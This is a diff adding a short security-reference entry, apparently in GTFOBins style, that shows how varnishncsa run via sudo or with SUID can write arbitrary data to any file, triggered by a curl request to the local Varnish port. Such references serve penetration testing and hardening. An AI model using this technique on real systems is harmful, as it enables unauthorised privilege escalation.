@@ -1,0 +1,21 @@
+varnishncsa
+===========
+
+File write
+----------
+
+[Sudo]
+    varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
+    The command hangs, so the trigger command must be performed asynchronously or in another terminal:
+
+```
+curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx
+```
+
+[SUID]
+    varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
+    The command hangs, so the trigger command must be performed asynchronously or in another terminal:
+
+```
+curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx
+```
